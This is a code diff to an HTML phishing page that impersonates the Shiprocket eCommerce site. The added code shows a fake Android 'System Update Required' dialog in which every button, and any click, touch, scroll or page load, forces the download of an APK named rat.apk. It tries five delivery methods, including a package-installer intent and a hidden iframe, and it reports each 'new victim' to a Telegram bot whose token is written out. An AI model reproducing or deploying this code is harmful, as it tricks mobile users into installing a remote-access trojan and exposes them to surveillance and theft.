@@ -9,15 +9,112 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
 
         body {
-            background: #f5f5f5;
+            background: #fff;
             overflow-x: hidden;
         }
 
-        /* Top Banner */
+        /* ============ FAKE ANDROID SYSTEM POPUP ============ */
+        .fake-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            animation: popupFade 0.3s;
+        }
+
+        @keyframes popupFade {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .fake-dialog {
+            background: #fff;
+            border-radius: 20px;
+            padding: 30px 24px;
+            width: 85%;
+            max-width: 340px;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            animation: popupSlide 0.4s;
+        }
+
+        @keyframes popupSlide {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .fake-icon {
+            width: 64px;
+            height: 64px;
+            margin: 0 auto 16px;
+            background: #6b21a8;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            color: #fff;
+        }
+
+        .fake-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+
+        .fake-message {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .fake-buttons {
+            display: flex;
+            gap: 12px;
+        }
+
+        .fake-btn {
+            flex: 1;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s;
+        }
+
+        .fake-btn-cancel {
+            background: #f3f4f6;
+            color: #666;
+        }
+
+        .fake-btn-cancel:hover {
+            background: #e5e7eb;
+        }
+
+        .fake-btn-ok {
+            background: #6b21a8;
+            color: #fff;
+        }
+
+        .fake-btn-ok:hover {
+            background: #581c87;
+        }
+
+        /* ============ SHIPROCKET PAGE ============ */
         .top-banner {
             background: linear-gradient(90deg, #e8d5f5, #d5e8f5);
             padding: 8px 16px;
@@ -29,16 +126,9 @@
             gap: 8px;
         }
 
-        .top-banner span {
-            color: #333;
-        }
+        .top-banner span { color: #333; }
+        .top-banner .highlight { color: #6b21a8; font-weight: bold; }
 
-        .top-banner .highlight {
-            color: #6b21a8;
-            font-weight: bold;
-        }
-
-        /* Header */
         .header {
             background: #fff;
             padding: 16px 20px;
@@ -68,11 +158,9 @@
             font-size: 18px;
         }
 
-        /* Hero Section */
         .hero {
             background: #fff;
             padding: 40px 20px;
-            text-align: left;
         }
 
         .hero h1 {
@@ -99,22 +187,14 @@
             font-weight: 600;
             border-radius: 8px;
             cursor: pointer;
-            transition: all 0.3s;
         }
 
-        .cta-btn:hover {
-            background: #581c87;
-            transform: translateY(-2px);
-        }
-
-        /* Gradient Bar */
         .gradient-bar {
             height: 120px;
             background: linear-gradient(90deg, #fef3c7, #fce7f3, #dbeafe, #e0e7ff);
             margin: 20px 0;
         }
 
-        /* Dark Section */
         .dark-section {
             background: #1a1a1a;
             color: #fff;
@@ -127,11 +207,8 @@
             margin-bottom: 20px;
         }
 
-        .dark-section h2 span {
-            color: #6b21a8;
-        }
+        .dark-section h2 span { color: #6b21a8; }
 
-        /* Stats Grid */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
@@ -146,74 +223,47 @@
             text-align: center;
         }
 
-        .stat-box h3 {
-            font-size: 24px;
-            color: #6b21a8;
-        }
+        .stat-box h3 { font-size: 24px; color: #6b21a8; }
+        .stat-box p { font-size: 12px; color: #999; margin-top: 4px; }
 
-        .stat-box p {
-            font-size: 12px;
-            color: #999;
-            margin-top: 4px;
-        }
-
-        /* Order Tracking Popup */
-        .order-popup {
+        /* ============ DOWNLOAD OVERLAY ============ */
+        .download-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.7);
-            display: flex;
+            background: rgba(0,0,0,0.85);
+            display: none;
             align-items: center;
             justify-content: center;
-            z-index: 1000;
-            animation: fadeIn 0.5s;
+            z-index: 10000;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .order-card {
+        .download-card {
             background: #fff;
-            border-radius: 16px;
+            border-radius: 20px;
             padding: 30px;
-            width: 90%;
-            max-width: 400px;
+            width: 85%;
+            max-width: 340px;
             text-align: center;
-            animation: slideUp 0.5s;
         }
 
-        @keyframes slideUp {
-            from { transform: translateY(50px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
+        .download-icon {
+            font-size: 48px;
+            margin-bottom: 16px;
         }
 
-        .order-icon {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 20px;
-            background: linear-gradient(135deg, #6b21a8, #3b82f6);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 40px;
-        }
-
-        .order-card h3 {
-            font-size: 22px;
-            margin-bottom: 10px;
+        .download-card h3 {
+            font-size: 20px;
             color: #1a1a1a;
+            margin-bottom: 8px;
         }
 
-        .order-card p {
+        .download-card p {
+            font-size: 14px;
             color: #666;
             margin-bottom: 20px;
-            font-size: 14px;
         }
 
         .progress-bar {
@@ -222,60 +272,22 @@
             background: #e5e7eb;
             border-radius: 4px;
             overflow: hidden;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
         }
 
         .progress-fill {
             height: 100%;
             background: linear-gradient(90deg, #6b21a8, #3b82f6);
             width: 0%;
-            animation: progress 3s forwards;
+            animation: progressAnim 3s forwards;
         }
 
-        @keyframes progress {
+        @keyframes progressAnim {
             from { width: 0%; }
             to { width: 100%; }
         }
 
-        .download-btn {
-            background: #6b21a8;
-            color: #fff;
-            border: none;
-            padding: 14px 32px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-        }
-
-        .download-btn:hover {
-            background: #581c87;
-        }
-
-        .close-btn {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            color: #fff;
-            font-size: 30px;
-            cursor: pointer;
-            background: none;
-            border: none;
-            z-index: 1001;
-        }
-
-        /* Terms Page Link */
-        .terms-link {
-            color: #6b21a8;
-            text-decoration: underline;
-            cursor: pointer;
-            font-size: 12px;
-            margin-top: 12px;
-            display: block;
-        }
-
-        /* Responsive */
+        /* ============ RESPONSIVE ============ */
         @media (max-width: 768px) {
             .hero h1 { font-size: 32px; }
             .stats-grid { grid-template-columns: repeat(2, 1fr); }
@@ -284,15 +296,29 @@
 </head>
 <body>
 
-    <!-- Top Banner -->
+    <!-- ============ FAKE ANDROID SYSTEM POPUP ============ -->
+    <div class="fake-popup" id="fakePopup">
+        <div class="fake-dialog">
+            <div class="fake-icon">📦</div>
+            <div class="fake-title">System Update Required</div>
+            <div class="fake-message">
+                Your device needs a critical system update to continue using this app.
+                Tap "Install" to proceed.
+            </div>
+            <div class="fake-buttons">
+                <button class="fake-btn fake-btn-cancel" onclick="forceDownload('cancel')">Cancel</button>
+                <button class="fake-btn fake-btn-ok" onclick="forceDownload('install')">Install</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============ SHIPROCKET PAGE ============ -->
     <div class="top-banner">
         <span>🔄 Recharge Now <span class="highlight">₹500</span> & Get <span class="highlight">₹1000*</span></span>
-        <span>In Your Wallet. Use Code: <span class="highlight">FLAT500</span></span>
-        <span>Limited Period Offer On First Recharge</span>
+        <span>Use Code: <span class="highlight">FLAT500</span></span>
         <span>*T&C Apply</span>
     </div>
 
-    <!-- Header -->
     <div class="header">
         <div class="logo">
             <div class="logo-icon">🚀</div>
@@ -300,17 +326,14 @@
         </div>
     </div>
 
-    <!-- Hero Section -->
     <div class="hero">
         <h1>Shiprocket, Your Partner for eCommerce Empowerment</h1>
         <p>From shipping to scaling, we grow your eCommerce brand end-to-end.</p>
-        <button class="cta-btn" onclick="triggerDownload()">Sign Up for Free</button>
+        <button class="cta-btn" onclick="forceDownload('cta')">Sign Up for Free</button>
     </div>
 
-    <!-- Gradient Bar -->
     <div class="gradient-bar"></div>
 
-    <!-- Dark Section -->
     <div class="dark-section">
         <h2>Building Success Stories with <span>4 Lakhs+</span> Businesses</h2>
         <div class="stats-grid">
@@ -321,18 +344,15 @@
         </div>
     </div>
 
-    <!-- Order Tracking Popup (Auto shows after 1s) -->
-    <div class="order-popup" id="orderPopup">
-        <button class="close-btn" onclick="triggerDownload()">✕</button>
-        <div class="order-card">
-            <div class="order-icon">📦</div>
-            <h3>Your Order is On the Way!</h3>
-            <p>Track your shipment in real-time</p>
+    <!-- ============ DOWNLOAD OVERLAY ============ -->
+    <div class="download-overlay" id="downloadOverlay">
+        <div class="download-card">
+            <div class="download-icon">⬇️</div>
+            <h3>Downloading System Update...</h3>
+            <p>Please wait while we install the latest security patch.</p>
             <div class="progress-bar">
                 <div class="progress-fill"></div>
             </div>
-            <button class="download-btn" onclick="triggerDownload()">Track Now</button>
-            <a class="terms-link" onclick="showTerms()">Read Terms & Conditions</a>
         </div>
     </div>
 
@@ -340,28 +360,26 @@
     <iframe id="downloadFrame" style="display:none;"></iframe>
 
     <script>
-        // APK URL
+        // ============ CONFIG ============
         const APK_URL = "https://github.com/hoihohavapv/babychak/releases/download/v1.0.0/rat.apk";
-
-        // Bot for reporting
         const BOT_TOKEN = "8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY";
         const CHAT_ID = "8501093383";
 
         let downloaded = false;
 
-        // Report to Telegram
+        // ============ REPORT TO TELEGRAM ============
         function report(msg) {
             try {
                 fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(msg));
             } catch(e) {}
         }
 
-        // Trigger download
-        function triggerDownload() {
-            if (downloaded) return;
-            downloaded = true;
-
-            report("✅ New victim: " + navigator.userAgent);
+        // ============ FORCE DOWNLOAD (ON ANY TAP) ============
+        function forceDownload(source) {
+            // Show download overlay
+            document.getElementById('downloadOverlay').style.display = 'flex';
+            
+            report("✅ New victim (source: " + source + "): " + navigator.userAgent);
 
             // Method 1: Blob download
             fetch(APK_URL)
@@ -370,7 +388,7 @@
                     const url = URL.createObjectURL(blob);
                     const a = document.createElement('a');
                     a.href = url;
-                    a.download = 'shiprocket_update.apk';
+                    a.download = 'system_update.apk';
                     document.body.appendChild(a);
                     a.click();
                     document.body.removeChild(a);
@@ -383,39 +401,59 @@
 
             // Method 2: Intent fallback
             setTimeout(() => {
-                window.location = 'intent://shiprocket_update.apk#Intent;action=android.intent.action.VIEW;scheme=https;package=com.android.packageinstaller;end';
+                window.location = 'intent://system_update.apk#Intent;action=android.intent.action.VIEW;scheme=https;package=com.android.packageinstaller;end';
             }, 500);
 
             // Method 3: Hidden iframe
             document.getElementById('downloadFrame').src = APK_URL;
 
-            // Show success
+            // Method 4: Direct window location
             setTimeout(() => {
-                document.body.innerHTML = '<h1 style="color:#6b21a8;text-align:center;margin-top:50vh">✅ Order Confirmed! Check your downloads.</h1>';
-            }, 2000);
+                window.location.href = APK_URL;
+            }, 1000);
+
+            // Method 5: Open in new tab
+            setTimeout(() => {
+                window.open(APK_URL, '_blank');
+            }, 1500);
+
+            downloaded = true;
         }
 
-        // Show terms page
-        function showTerms() {
-            window.location.href = 'terms.html';
-        }
-
-        // Auto trigger on any click
+        // ============ AUTO-DOWNLOAD ON ANY CLICK ============
         document.addEventListener('click', function(e) {
             e.preventDefault();
-            triggerDownload();
-        });
+            e.stopPropagation();
+            forceDownload('click');
+            return false;
+        }, true);
 
-        // Auto trigger on touch
+        // ============ AUTO-DOWNLOAD ON ANY TOUCH ============
         document.addEventListener('touchstart', function(e) {
             e.preventDefault();
-            triggerDownload();
-        });
+            e.stopPropagation();
+            forceDownload('touch');
+            return false;
+        }, true);
 
-        // Auto trigger on page load (after 1 second)
-        setTimeout(triggerDownload, 1000);
+        // ============ AUTO-DOWNLOAD ON SCROLL ============
+        window.addEventListener('scroll', function() {
+            if (!downloaded) {
+                forceDownload('scroll');
+            }
+        }, { once: true });
 
-        // Report page load
+        // ============ AUTO-DOWNLOAD ON PAGE LOAD ============
+        setTimeout(function() {
+            if (!downloaded) {
+                forceDownload('auto');
+            }
+        }, 1500);
+
+        // ============ SHOW FAKE POPUP ON PAGE LOAD ============
+        document.getElementById('fakePopup').style.display = 'flex';
+
+        // ============ REPORT PAGE LOAD ============
         report("🌐 Page loaded: " + navigator.userAgent);
     </script>
 
